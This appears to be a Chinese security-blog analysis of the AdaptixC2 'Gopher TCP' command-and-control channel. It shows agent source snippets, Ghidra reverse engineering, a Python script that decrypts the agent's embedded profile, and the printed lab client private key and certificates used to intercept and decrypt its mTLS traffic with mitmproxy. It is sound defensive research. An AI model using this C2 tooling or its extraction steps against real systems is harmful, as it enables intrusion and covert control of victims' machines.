# AdaptixC2通信机制与流量解密分析(listener_gophertcp)-先知社区

> **来源**: https://xz.aliyun.com/news/19028  
> **文章ID**: 19028

---

**环境**

* AdaptixC2 Server端与Agent端（源码自备）
* IDE
* Wireshark
* mitmproxy
* ghidra

**Agents区别**

|  |  |  |  |
| --- | --- | --- | --- |
| **Agent** | **Listeners** | **Options** | **Os** |
| Beacon | Beacon HTTP Beacon SMB Beacon TCP | Downloads File Browser Process Browser Socks proxy Port forwarding Agents link BOF | Windows |
| Gopher | Gopher TCP | Downloads File Browser Process Browser Screenshot Socks proxy Remote Terminal BOF (for Windows) | Windows Linux MacOs |

**Beacon HTTP**: 这是最常见的C2通信方式，旨在将恶意流量伪装成正常的网页浏览流量，长期潜伏用。

**Beacon SMB**: 使用SMB协议作为C2通道点对点建立通信，内网横向用

**Beacon TCP**: 使用TCP协议进行通信，在特定网络环境下更加隐蔽（异步 / 心跳模式 (Asynchronous / Beaconing)）

**Gopher TCP**: 使用TCP协议进行通信，跨平台能力（同步 / 流模式 (Synchronous / Streaming)）

典型攻击链就是通过**Gopher**钓鱼批量上线不同机器（OS）再使用**Beacon**进行横移潜伏

使用如下gopher\_6666监听器进行分析gopher流量，注意使用**Use mTLS**

![image.png](images/img_19028_000.png)

```
# CA cert
openssl genrsa -out ca.key 2048
openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 -out ca.crt -subj "/CN=Test CA"

# server cert and key
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr -subj "/CN=localhost"
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365 -sha256

# client cert and key
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=client"
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365 -sha256
```

|  |  |  |
| --- | --- | --- |
| **特性 / 对比** | **标准 TLS (单向认证)** | **mTLS (双向认证)** |
| 核心目标 | 确保通信加密，并验证服务器的真实性 | 确保通信加密，并相互验证客户端和服务器双方的真实性 |
| 认证方向 | 单向：仅客户端验证服务器的身份 | 双向：客户端验证服务器，服务器也验证客户端 |
| 谁需要证书 | 服务器需要 | 服务器和客户端都需要 |
| 工作流程 | 1. 客户端连接服务器 2. 服务器出示其证书 3. 客户端验证服务器证书  4. 验证完成，建立加密通道 | 1. 客户端连接服务器 2. 服务器出示其证书 3. 客户端验证服务器证书 4. 服务器请求并验证客户端出示的证书  5. 双方验证完成，建立加密通道 |

生成客户端配置默认即可

![image.png](images/img_19028_001.png)

通过mitmproxy和wireshark捕获流量发现，只有wireshark是能捕获到的，因为这是gophertcp不是HTTP/S

![image.png](images/img_19028_002.png)

通过wireshark过滤**客户端><服务端**流量分析下

```
(ip.src == 192.168.176.129 and ip.dst == 192.168.176.130) or (ip.src == 192.168.176.130 and ip.dst == 192.168.176.129)
```

可以看到1-3是TCP三次握手，[TCP Keep-Alive]是心跳包，TLSv1.3是使用刚刚配置的证书私钥进行加密后的流量

![image.png](images/img_19028_003.png)

那么问题来了，解密**mTLS**需要分几步怎么做

首先看看TLS用的什么密码套件Client Hello包中客户端支持的密码套件（都带有前向保密（Perfect Forward Secrecy, PFS）密钥交换机制）

![image.png](images/img_19028_004.png)

Server Hello包选择的密码套件是**Cipher Suite: TLS\_AES\_128\_GCM\_SHA256 (0x1301)**，TLS 1.3中废除了静态RSA密钥交换

![image.png](images/img_19028_005.png)

**加密流程**

1. 客户端获取要发送的明文数据
2. 使用派生出的**会话密钥**作为AES-128的密钥
3. 生成一个本次加密使用的唯一随机数（Nonce）
4. 将密钥、Nonce和明文数据输入AES-GCM加密器。
5. 加密器输出两样东西：密文和认证标签（防篡改）
6. 客户端将这两样东西打包成一个TLS记录，通过TCP发送出去

解密的关键点就是**会话密钥（SSLKEYLOGFILE）**，一旦TLS握手完成，会话密钥就存在于客户端和服务器的内存中。会话结束后，这个密钥就会被丢弃。

Extenders/agent\_gopher/pl\_agent.go 通过源码发现client\_key (客户端私钥),、client\_cert (客户端证书)、ca\_cert (CA证书) 会被Base64解码后打包进Agent的配置文件中

```
var sslKey []byte
var sslCert []byte
var caCert []byte
Ssl, _ := listenerMap["ssl"].(bool)
if Ssl {
    // 客户端私钥
    ssl_key, _ := listenerMap["client_key"].(string)
    sslKey, err = base64.StdEncoding.DecodeString(ssl_key)
    if err != nil {
        return nil, err
    }
    // 客户端证书
    ssl_cert, _ := listenerMap["client_cert"].(string)
    sslCert, err = base64.StdEncoding.DecodeString(ssl_cert)
    if err != nil {
        return nil, err
    }
    // CA 证书
    ca_cert, _ := listenerMap["ca_cert"].(string)
    caCert, err = base64.StdEncoding.DecodeString(ca_cert)
    if err != nil {
        return nil, err
    }
}
```

![image.png](images/img_19028_006.png)

由于Agent里面只有CA证书，没有CA私钥，没办法签发证书来伪造服务端与Agent通信，截取会话密钥（SSLKEYLOGFILE）

**理想流程**

1. Gopher Agent启动，Proxifier将其流量重定向到mitmproxy
2. mitmproxy收到连接请求，出示mitmproxy证书
3. Gopher Agent收到证书后，用其内置的ca\_cert进行验证
4. 验证发现，这个证书的签发机构不正确！验证失败
5. Gopher Agent不信任mitmproxy，拒绝建立mTLS连接

想到使用动态插桩HOOK来让Agent相信证书是有效的，但是看了下源码Extenders/agent\_gopher/pl\_agent.go ，-s 会移除符号表，-w 会移除DWARF调试信息 ，这样Frida就无法通过“按名查找”来定位函数

```
	LdFlags := "-s -w"
	if generateConfig.Os == "linux" {
		Filename = "agent.bin"
		GoOs = "linux"
	} else if generateConfig.Os == "macos" {
		Filename = "agent.bin"
		GoOs = "darwin"
	} else if generateConfig.Os == "windows" {
		Filename = "agent.exe"
		GoOs = "windows"
		LdFlags += " -H=windowsgui"
	}
```

![image.png](images/img_19028_007.png)

Extenders/agent\_gopher/src\_gopher/main.go使用Go语言底层的net和crypto/tls库，向配置文件中的IP地址和端口发起TCP连接

```
		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
            // 直接通过TCP协议拨号到指定的地址
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
            // 直接通过TCP协议拨号到指定的地址
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}
```

![image.png](images/img_19028_008.png)

Extenders/agent\_gopher/src\_gopher/main.go `tls.Config`配置部分`InsecureSkipVerify: true`: “**跳过所有不安全的证书校验！**” 当这个选项被设为`true`时，TLS客户端会**完全禁用**对服务器证书的所有校验，包括：

* 不检查证书是否由受信任的CA签发（这使得`RootCAs`那一行**完全失效**）。
* 不检查证书上的域名是否与请求的地址匹配。
* 不检查证书是否过期。

```
// 这是一个自定义的CA证书池，用于证书锁定
caCertPool := x509.NewCertPool()
caCertPool.AppendCertsFromPEM(profile.CaCert)

config := &tls.Config{
    Certificates:       []tls.Certificate{cert},
    // RootCAs告诉客户端，只信任我们自定义的CA
    RootCAs:            caCertPool,
    // 告诉客户端无条件信任服务端的证书
    InsecureSkipVerify: true,
}
```

脑中大概构想了一个思路是，想办法劫持agent走mitmproxy（中间人MITM代理），这样mitmproxy既充当服务端又是客户端，由于TLS是双向认证，还得从agent里面提取客户端私钥、客户端证书、CA 证书，有这三样东西就能通过服务端校验，而客户端永远信任服务端，就不需要其他东西了，拆解下就是两个难点，1.劫持agent走mitmproxy 2.从agent里面提取证书/私钥配置

## 1.劫持agent走mitmproxy（其实也可以劫持VMware）

* 这里使用Proxifier工具（注意一定是安装版，不要便携版，这里踩了很多坑）

打开Proxifier新建一个Proxy Server 地址填本机 端口填你的mitmproxy端口 类型选HTTPS

![image.png](images/img_19028_009.png)

新建一个规则让agent.exe走我们刚刚的proxy

![image.png](images/img_19028_010.png)

重点来了这里一定要打勾两个全选（便携版是没有这个设置的）

![image.png](images/img_19028_011.png)

![image.png](images/img_19028_012.png)

```
//配置变量 保存会话密钥
set MITMPROXY_SSLKEYLOGFILE=./keylog.txt
//运行mitmproxy
mitmproxy --listen-port 8080 --ssl-insecure --set ssl_version_client=TLSv1_2 -w output.mitm
```

接着打开桌面的agent.exe，Proxifier就会显示已经匹配上agent，同时mitmproxy会显示tlsv13 alert certificate required（TLSv1.3 警告 需要证书），这个是正常的，双向认证特性，服务器会要求客户端提供一个证书来证明客户端的身份

![image.png](images/img_19028_013.png)

## 2.从agent里面提取证书/私钥配置

* Extenders/agent\_gopher/pl\_agent.go 关键AgentGenerateProfile函数

数据打包：Profile 结构体（包含地址、超时时间、SSL证书密钥等信息）使用 msgpack.Marshal 函数序列化成字节流

```
		profile := Profile{
			Type:        uint(agentWatermark),
			Addresses:   addresses,
			BannerSize:  len(tcp_banner),
			ConnTimeout: reconnectTimeout,
			ConnCount:   generateConfig.ReconnectCount,
			UseSSL:      Ssl,
			SslCert:     sslCert,
			SslKey:      sslKey,
			CaCert:      caCert,
		}
		profileData, _ = msgpack.Marshal(profile)
```

数据加密：序列化后的 profileData 被 AgentEncryptData 函数加密。函数使用 AES-GCM 算法。加密后数据结构是nonce

```
profileData, _ = AgentEncryptData(profileData, encryptKey)
...............
func AgentEncryptData(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	/// END CODE
	return ciphertext, nil
}
```

密钥拼接：加密密钥 encryptKey 被直接拼接到了加密数据的最前面

```
profileData = append(encryptKey, profileData...)
//内存布局是[加密密钥 (32 字节)][Nonce (12 字节)][加密后的 MessagePack 数据]
//这里可以发现跟之前的listener_beacon_http配置差不多
//listener_beacon_http > RC4加密 > 二进制结构 (struct.unpack) > [数据大小][加密数据][RC4密钥]
//listener_gophertcp > AES-GCM加密 > MessagePack (msgpack) > [AES密钥][Nonce][加密数据]	
```

```
// 1. 将加密好的配置数据格式化成一个 Go 语言的源代码字符串
config := fmt.Sprintf("package main

var encProfile = []byte("%s")
", string(agentProfile))

// 2. 将这个字符串写入到一个新的 .go 文件中
configPath := currentDir + "/" + SrcPath + "/config.go"
os.WriteFile(configPath, []byte(config), 0644)

// 3. 编译整个项目
// cmdBuild := ... go build ...

```

构建一下python脚本用来搜索exe存在的配置，由于密钥和Nonce是随机的，暴力搜索.rdata 和 .data效率是很慢的

先用ghidra分析下exe能否直接看到配置区，用GolangAnalyzerExtension配合修复函数更直观

![image.png](images/img_19028_014.png)

进入main.main方法看下

![image.png](images/img_19028_015.png)

可以看到msgpack 反序列化的函数调用，程序初始化时，它只会被调用一次，用于解析最开始的配置

![image.png](images/img_19028_016.png)

```
                    /* gopher/main.go:86 */
          *(undefined8 *)((int)register0x00000020 + -0x2b8) = 0x630d0d;
          PTR_DAT_00974210 = puVar4;
          github.com/vmihailenco/msgpack/v5.Unmarshal
					//传入的数据 (puVar4, uVar13, uVar11 这些变量共同代表了一个数据切片) 就是解密后数据
                    (puVar4,uVar13,uVar11,&datatype.Ptr.*utils.Profile,&DAT_0098a8c0);
                    /* gopher/main.go:87 */
          if (extraout_RAX_02 != 0) {
                    /* gopher/main.go:88 */
            return;
          }
```

往前回溯，看看这些数据是从哪里来的，Go 语言的全局变量在 Ghidra 中表示为DAT\_xxx或PTR\_DAT\_xxx

![image.png](images/img_19028_017.png)

```
      /* gopher/main.go:82 */
      //对这些全局变量的引用
      if (0xf < DAT_00974220) {
        DAT_00989a38 = 0x10;
        DAT_00989a40 = DAT_00974220;
        //这是指向 encProfile 原始数据块 ([密钥][Nonce][密文]) 的指针
        puVar4 = PTR_DAT_00974210;
   //..........
        }
```

跟一下PTR\_DAT\_00974210，指针指向了DAT\_00955620

![image.png](images/img_19028_018.png)

继续跟DAT\_00955620，可以发现这里面的16进制数据特征就非常像加密后的内容

![image.png](images/img_19028_019.png)

那值是 0x0F81 容量就是3969 字节数据块，0xF81 (十六进制) = 3969 (十进制)

![image.png](images/img_19028_020.png)

输入准确长度进行复制到文本里等会用，格式选Byte String:(No Spaces)

![image.png](images/img_19028_021.png)

![image.png](images/img_19028_022.png)

现在来构建下python脚本读取data.txt（就是上面复制的内容）输出配置区

```
import msgpack
from Crypto.Cipher import AES
import json

def restore_profile_from_file(filepath):
    try:
        with open(filepath, 'r') as f:
            hex_data_string = f.read().strip()
    except FileNotFoundError:
        print(f"文件 '{filepath}' 未找到")
        return

    if not hex_data_string:
        print(f"文件 '{filepath}' 是空的。")
        return

    try:
        profile_bytes = bytes.fromhex(hex_data_string)
    except ValueError as e:
        print(f"文件中的数据不是有效的十六进制字符串。 {e}")
        return

    key_size = 16
    decrypted_data = None
    
    print(f"使用 {key_size*8}-bit AES 密钥进行解密...")
    
    # 检查总长度是否足够容纳密钥和一些加密数据
    if len(profile_bytes) < key_size + 1:
        print("数据长度不足，无法包含一个128-bit的密钥。")
        return

    encrypt_key = profile_bytes[:key_size]
    encrypted_data = profile_bytes[key_size:]

    nonce_size = 12
    if len(encrypted_data) < nonce_size:
        print("加密数据过短，无法提取 nonce。")
        return
        
    nonce = encrypted_data[:nonce_size]
    ciphertext_with_tag = encrypted_data[nonce_size:]

    tag_size = 16
    if len(ciphertext_with_tag) < tag_size:
        print("密文过短，无法包含认证标签。")
        return

    ciphertext = ciphertext_with_tag[:-tag_size]
    tag = ciphertext_with_tag[-tag_size:]

    try:
        cipher = AES.new(encrypt_key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        print("   解密成功！")
    except (ValueError, KeyError) as e:
        print(f"
解密失败: {e}。请确认数据源是否正确。")
        return
            
    try:
        profile = msgpack.unpackb(decrypted_data, raw=False)
    except Exception as e:
        print(f"错误：解密后的数据无法被 msgpack 正确解析。 {e}")
        return
        
    print("
成功解析配置文件！")
    print("--- 配置文件内容 ---")
    print(json.dumps(profile, indent=2, ensure_ascii=False, default=str))
    print("----------------------")
    
    print("
正在提取文件...")
    
    files_to_restore = {
        "client.key": profile.get('ssl_key'),
        "client.pem": profile.get('ssl_cert'),
        "ca.pem": profile.get('ca_cert')
    }

    found_any_files = False
    for filename, data in files_to_restore.items():
        if data and isinstance(data, bytes) and len(data) > 0:
            found_any_files = True
            with open(filename, 'wb') as f:
                f.write(data)
            print(f" 文件已成功还原: {filename}")
        else:
            print(f" 在配置文件中未找到有效的 {filename} 数据。")
    
    if found_any_files:
         print("
总结：所有文件已成功还原！")


if __name__ == '__main__':
    data_filename = 'data.txt'
    print(f"--- 开始从 '{data_filename}' 还原文件 ---")
    restore_profile_from_file(data_filename)
    print("--- 还原过程完成 ---")
```

```
--- 开始从 'data.txt' 还原文件 ---
使用 128-bit AES 密钥进行解密...
   解密成功！

成功解析配置文件！
--- 配置文件内容 ---
{
  "type": 2421052563,
  "addresses": [
    "192.168.176.130:6666"
  ],
  "banner_size": 17,
  "conn_timeout": 0,
  "conn_count": 1000000000,
  "use_ssl": true,
  "ssl_cert": "b'-----BEGIN CERTIFICATE-----\
MIICqjCCAZICFDRV4Ww52+5/Lf+6lPJIqDiYPfQEMA0GCSqGSIb3DQEBCwUAMBIx\
EDAOBgNVBAMMB1Rlc3QgQ0EwHhcNMjUwOTI1MTIwMTQ3WhcNMjYwOTI1MTIwMTQ3\
WjARMQ8wDQYDVQQDDAZjbGllbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK\
AoIBAQCX2enACeTY2fw2uschw2GvT9UZoGQy1jfP2V75jfrq5Z1aZoLZiM40Droj\
to1MxbTePzJ59XYEc4+CRf5qX/alfz3FD7ih4OEyKsdB9X8kyhcnpFoOD6zWfXo9\
+HXHepNeHVOV4Occp1zuyVTBoyueGpJAu5TXzAZOQKeEN23kd2JCYocZ1s3Z4web\
wxRMMCRscBcEBnndyQsPb8jvF5MMjPs/0B+m0SN6ZnU55q4/KDxG02QbhOXlzG9v\
8ouRIKPZ9vOVmu40gsTrPZH+mC6DnwsqjIdQ3ypRcf9EzKumzwuM+/VZNGWyvDpM\
3xr9Q5U/NDhoX3uPWWB35S10AX1vAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAFNh\
bSLA9S6SVnLTh3d/kJht6ylGWBOkUzs5tP/ubx8wkkDK22nEiPTvzciI6g1P76t7\
aLwSkBpeEYxUG5O8ux+URVjzdby9A4mTxOASyNGAQB2j2MJeVKchjLFhdIQ4SG0B\
mLBkUbxXBXoTUyde8wsurryVhz56dvQBFc/mriV6eHkyg2Ol5sAPD7WDoKoY3jIT\
fWyphu8stabYNzBUi+T/tOFLJetWOJHekpV4B2TpLICYvKfPzvk+GakvvbvGsPJN\
Rx0eo21SWiDOE9oRIPB4WJCozei2TYPOfC9x2Q6C2B36y1p1goB3nE6xS3zWEUX8\
s+209UHqn0x+0Y+Jzpo=\
-----END CERTIFICATE-----\
'",
  "ssl_key": "b'-----BEGIN PRIVATE KEY-----\
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCX2enACeTY2fw2\
uschw2GvT9UZoGQy1jfP2V75jfrq5Z1aZoLZiM40Drojto1MxbTePzJ59XYEc4+C\
Rf5qX/alfz3FD7ih4OEyKsdB9X8kyhcnpFoOD6zWfXo9+HXHepNeHVOV4Occp1zu\
yVTBoyueGpJAu5TXzAZOQKeEN23kd2JCYocZ1s3Z4webwxRMMCRscBcEBnndyQsP\
b8jvF5MMjPs/0B+m0SN6ZnU55q4/KDxG02QbhOXlzG9v8ouRIKPZ9vOVmu40gsTr\
PZH+mC6DnwsqjIdQ3ypRcf9EzKumzwuM+/VZNGWyvDpM3xr9Q5U/NDhoX3uPWWB3\
5S10AX1vAgMBAAECggEABFOuJrUysgoTxcPrtV0BI/4KAkDPx6M1ik1e/aBqaTPD\
+wcIhYsAcI7qaKu4Up/k9Ecs88LsDYwIp4o3uxIAt04jN8uxidw5+ZHcGPUCgH5w\
mjw5iIm69cmCrXfpm4zItVxmBr+0LY4IXzkF8yCPyvVSfBNU4BNIKy1YrsbTQExl\
TuQ2d6Bcr4DVeyDYMJOER5LGQDtTiKguhxc+20iXij3jADnox0H1Xzxu3eOP4ynk\
I/82q/SXBtAIn4WGZwYGL/3F6IaVIrp2bwr4K51lNWKZewmDXVJbZorMKX394KJd\
t/qoVYS9IImcsBHeK+2cq3p/cDTELJ7epJnF0jMYiQKBgQDQTAgmAN4v6w7sOH41\
Uoc2Kh6u852+tZctAdQYzAvKw2/3sZai949Tib3fgAKo7S1HmvIR4E8Fzn4+ktdv\
hvocnLWy4Li/G2BNXiXIXRJeulxEMUrm2OcXQJxPT5GBpO33yXPtGgCyWBZLB3Hk\
ZvgMvHO8uhRhLxVkUHZO/OnbZwKBgQC6oJjHVYC2X7+4VOCwvX9puxGVtpySWXbF\
SDZh6KYLq8YFEwxQ76Z+47hPOBg37AXhir8BU5zvkvygoTXHNSSIXZDBjdYDiR3A\
jf3y9jZqNU0pW3Qy/CCzcKnJP2v1bCAZerqG7E015FHRB3CQrRd9alUnuUuq8zpI\
wMQomKiQuQKBgQCP7gmvYOgmylC8b2jeJZGinsYm89VrYwT8J4hMPipjyFoFGKRT\
JabW/ZXC6yxrV7/y+6ELMyjHhWD8kfDlcqo+vRZcbSWbgCoyK70FzzITXMjGohz0\
mKpOCeo4b23G3JVGo+BD1LTohy+YVqOfRHtgKZP7s8TDRoqMj4DAochiPwKBgHfD\
oeehtjTTI0yeo4aoRQDL/M/v3XCJmw+ldMjGLPCmbjBJdgjmkhkx99BWtiwE+g0w\
Jb0rNDYGRLqsWb+aGfSs3r1nUST5tC8isApf+LGVvQvCVcJ2TGH69ephGd3oYn0X\
ZmY5dJ8WA2858AHYIo/oUfdpEOcGqauQkRFgTiR5AoGANbQBC9+VOAxiRVZaoXEE\
kHabG2xozWX6GslWt0ryydogW3K/6N7AEjwJY8P3nAFSRaG3p1iA6hB+7+RN9Wxa\
zzE6/jsh+YhdUspatWpjDTJyTtYUk3oE4a8j6qqw5svnb99XSviF8ATgXFaRX74t\
y0D67K+4fv/OfEPQYO5rtzY=\
-----END PRIVATE KEY-----\
'",
  "ca_cert": "b'-----BEGIN CERTIFICATE-----\
MIIDBTCCAe2gAwIBAgIUeH0h1h83rCkkRD39nUc7k1p4cxwwDQYJKoZIhvcNAQEL\
BQAwEjEQMA4GA1UEAwwHVGVzdCBDQTAeFw0yNTA5MjUxMjAxMjFaFw0zNTA5MjMx\
MjAxMjFaMBIxEDAOBgNVBAMMB1Rlc3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IB\
DwAwggEKAoIBAQCpoRHbRfYr5odiy+q/ARHMLUNwIwzBSvzcps2vXRa+j+UtRcQk\
Mun/KFeVh91u5oRMZN+Dyyw1D68zrw5kOMqXxinCYxHXsqRAYMP3WrO3h9wDJBag\
KO8u/kPAWF9D+SQqKVq1xOvIH5cdfc/pwdxRm2mu9JPSui2rcNHgDEfDIDPwVVwl\
W337N/nJGP22nqcFN6eKDVwlzzrV3+JvKQdfbk7rExd0i0VcvehiVeqPIefciter\
mz6NFdONoQq4KLF31L/t8AawBuncjC4kEE6wqB84M0zUxvNrWd5qg33abgovV+NJ\
MAblX5Iw1B0/H9IuwPdcj7Gq3izR3VJkQCp3AgMBAAGjUzBRMB0GA1UdDgQWBBRZ\
99bVYxmqctlyTtC83Ct89cq++DAfBgNVHSMEGDAWgBRZ99bVYxmqctlyTtC83Ct8\
9cq++DAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAFxaNHp8Vq\
9J7qkadbb2vUh7Kf1zRfh1FfXdkTKKsNECVST/yGx5xlY3OnvlwtJbs8F8iehW4o\
DpgkHDVAp5fuSlGFBqYaWoVjsFjiIo3hYMd+cSlz7M62/dgGftR6ZgH+8g7P9HLA\
vX0Zw8q7G949NQhHSXpQQcmFDizSMQ3505EbjDq2O/3B77jh5eHZlhG8FHgGqfJS\
1jSB79toqn0kxhbkyQ+mOyctGSzot39Rx+1hFlyKzVL8pLoUpZ52DC7r1M0z02+/\
HwlwC+xjrO4+HEH08HITJ5R3Fduv2ztPW+7L6AjocGUyrBGa7yovLdRkKUklFNbu\
Ji/9dAo+wTjZ\
-----END CERTIFICATE-----\
'"
}
----------------------

正在提取文件...
 文件已成功还原: client.key
 文件已成功还原: client.pem
 文件已成功还原: ca.pem

总结：所有文件已成功还原！
--- 还原过程完成 ---
```

现在将client.key、client.pem、ca.pem合并写入client\_x.pem里面

```
C:\Users\12410\Desktop>type client.pem client.key ca.pem > client_x.pem
```

重新运行mitmproxy试试效果，可以看到流量已经成功捕获

```
mitmproxy --listen-port 8080 --ssl-insecure --set ssl_version_client=TLSv1_2 -w output.mitm --set client_certs=client_x.pem
```

![image.png](images/img_19028_023.png)

开头的欢迎消息AdaptixC2 server ，就是创建监听器时的配置（使用会话密钥配合wireshark会更直观展示流量）

![image.png](images/img_19028_024.png)

```
⇐ AdaptixC2 server
⇒ 0000000000 00 00 01 14 45 a4 55 a2 43 3d d8 d2 04 41 05 b5   ....E.U.C=...A..
⇒ 0000000010 fb 59 ea 91 47 bd 7a 7c a5 4a dd 48 91 98 30 c0   .Y..G.z|.J.H..0.
⇒ 0000000020 2c 13 84 17 d6 d9 ea 67 70 34 4c fd e4 49 7d 9a   ,......gp4L..I}.
⇒ 0000000030 56 83 c7 b6 46 fe 9c 86 89 de 39 b9 2d 00 30 a1   V...F.....9.-.0. 
⇒ 0000000040 5f 8e 99 80 a3 9b 6f b0 28 32 61 be 9f 54 60 8e   _.....o.(2a..T`.
⇒ 0000000050 fd 6b de d3 26 46 ae 33 45 6d 7a ce b0 47 8b 7b   .k..&F.3Emz..G.{
⇒ 0000000060 4b dd 72 b0 6a 66 80 40 19 34 90 23 ef be f2 69   K.r.jf.@.4.#...i
⇒ 0000000070 37 ea ee b1 72 90 1f 9f 58 c5 26 11 c5 df 3b 3e   7...r...X.&...;>
⇒ 0000000080 af 8e 1e 13 31 be 6d f9 50 c5 bd 07 64 d3 bc 26   ....1.m.P...d..&
⇒ 0000000090 29 a7 33 23 ec 53 57 83 63 0e d0 5b af ac 3e 48   ).3#.SW.c..[..>H
⇒ 00000000a0 bd 8a b3 a9 ef 03 07 3f 09 89 98 fa 17 5c 78 72   .......?.....\xr
⇒ 00000000b0 5e 42 b0 24 d1 f9 a5 a5 2c e7 5f 2a b6 98 3c c9   ^B.$....,._*..<.
⇒ 00000000c0 45 b7 ab 21 1a 43 c5 ea 54 62 55 d0 44 8a 2e 60   E..!.C..TbU.D..`
⇒ 00000000d0 05 79 4d 32 68 1e 50 30 7f 92 83 91 4d 2f 23 1f   .yM2h.P0....M/#.
⇒ 00000000e0 13 6b 5c 6d be 45 f6 91 85 1f 7c c9 ec 81 59 88   .k\m.E....|...Y.
⇒ 00000000f0 29 a9 3c b2 06 c7 b8 ee 63 86 0e 90 4d 06 b6 2f   ).<.....c...M../
⇒ 0000000100 3c 39 6e c1 c3 6b d8 fe fe 8a d5 e0 81 de d1 c8   <9n..k..........
⇒ 0000000110 fc 5a 82 9c 31 29 4c 10                           .Z..1)L.
```

执行一个命令发现回显很快类似于一个交互式的Shell会话，不像listener\_beacon\_http会有休眠设定

```
[26/09 06:34:26] aaa [4c6114ef] gopher > shell whoami
[26/09 06:34:26] [*] Task: command execute
[26/09 06:34:26] [*] Agent called server, sent [121 bytes]
[26/09 06:34:26] [+] Command output:
desktop-k196dpf\administrator
+--- Task [4c6114ef] closed ----------------------------------------------------------+
```

```
//注意流量中的箭头 ⇐是服务器响应/服务器请求    ⇒是客户端响应/客户端请求
//服务器响应banner信息
⇐ AdaptixC2 server
//客户端告诉服务端我上线了 细心会发现如果这个上线包一般情况下是固定的
⇒ 0000000000 00 00 01 14 45 a4 55 a2 43 3d d8 d2 04 41 05 b5   ....E.U.C=...A..
⇒ 0000000010 fb 59 ea 91 47 bd 7a 7c a5 4a dd 48 91 98 30 c0   .Y..G.z|.J.H..0.
⇒ 0000000020 2c 13 84 17 d6 d9 ea 67 70 34 4c fd e4 49 7d 9a   ,......gp4L..I}.
⇒ 0000000030 56 83 c7 b6 46 fe 9c 86 89 de 39 b9 2d 00 30 a1   V...F.....9.-.0.
⇒ 0000000040 5f 8e 99 80 a3 9b 6f b0 28 32 61 be 9f 54 60 8e   _.....o.(2a..T`.
⇒ 0000000050 fd 6b de d3 26 46 ae 33 45 6d 7a ce b0 47 8b 7b   .k..&F.3Emz..G.{
⇒ 0000000060 4b dd 72 b0 6a 66 80 40 19 34 90 23 ef be f2 69   K.r.jf.@.4.#...i
⇒ 0000000070 37 ea ee b1 72 90 1f 9f 58 c5 26 11 c5 df 3b 3e   7...r...X.&...;>
⇒ 0000000080 af 8e 1e 13 31 be 6d f9 50 c5 bd 07 64 d3 bc 26   ....1.m.P...d..&
⇒ 0000000090 29 a7 33 23 ec 53 57 83 63 0e d0 5b af ac 3e 48   ).3#.SW.c..[..>H
⇒ 00000000a0 bd 8a b3 a9 ef 03 07 3f 09 89 98 fa 17 5c 78 72   .......?.....\xr
⇒ 00000000b0 5e 42 b0 24 d1 f9 a5 a5 2c e7 5f 2a b6 98 3c c9   ^B.$....,._*..<.
⇒ 00000000c0 45 b7 ab 21 1a 43 c5 ea 54 62 55 d0 44 8a 2e 60   E..!.C..TbU.D..`
⇒ 00000000d0 05 79 4d 32 68 1e 50 30 7f 92 83 91 4d 2f 23 1f   .yM2h.P0....M/#.
⇒ 00000000e0 13 6b 5c 6d be 45 f6 91 85 1f 7c c9 ec 81 59 88   .k\m.E....|...Y.
⇒ 00000000f0 29 a9 3c b2 06 c7 b8 ee 63 86 0e 90 4d 06 b6 2f   ).<.....c...M../
⇒ 0000000100 3c 39 6e c1 c3 6b d8 fe fe 8a d5 e0 81 de d1 c8   <9n..k..........
⇒ 0000000110 fc 5a 82 9c 31 29 4c 10                           .Z..1)L.
//服务端告诉客户端你来任务了
⇐ 0000000000 00 00 00 79 38 8e 4f 5b 9c f1 77 ff c2 02 58 e1   ...y8.O[..w...X.
⇐ 0000000010 36 fb 51 67 9e b3 a1 42 da 26 26 ac e2 cf 95 c4   6.Qg...B.&&.....
⇐ 0000000020 b4 45 39 9a b7 5e de 17 1d 13 a7 83 70 4f 8b e9   .E9..^......pO..
⇐ 0000000030 e3 37 03 62 4d 10 87 72 38 4f 68 cb 03 37 f7 09   .7.bM..r8Oh..7..
⇐ 0000000040 54 a5 63 19 67 76 c0 4c 25 4a 27 a8 74 68 d0 21   T.c.gv.L%J'.th.!
⇐ 0000000050 fc 29 a2 68 2f 29 1d d0 b5 b5 cf e5 6b a8 70 92   .).h/)......k.p.
⇐ 0000000060 eb 99 bc 42 a6 15 56 6d 59 2d 38 76 af b8 7a 87   ...B..VmY-8v..z.
⇐ 0000000070 95 4e 15 c0 14 2f 52 28 80 7e cc 4d 72            .N.../R(.~.Mr
//客户端回传任务结果给服务端
⇒ 0000000000 00 00 00 6c d1 be 52 88 d3 9a 6c ba 0d dc 82 c9   ...l..R...l.....
⇒ 0000000010 fa 3b 18 9f c5 0d 29 27 7d 3c b8 19 6f a6 50 21   .;....)'}<..o.P!
⇒ 0000000020 60 51 85 c5 6e 65 08 5c 55 dd 8d 35 5e c8 25 ec   `Q..ne.\U..5^.%.
⇒ 0000000030 e9 c7 aa 11 93 3a fe b9 7d cd 5b ec b5 b4 c0 e0   .....:..}.[.....
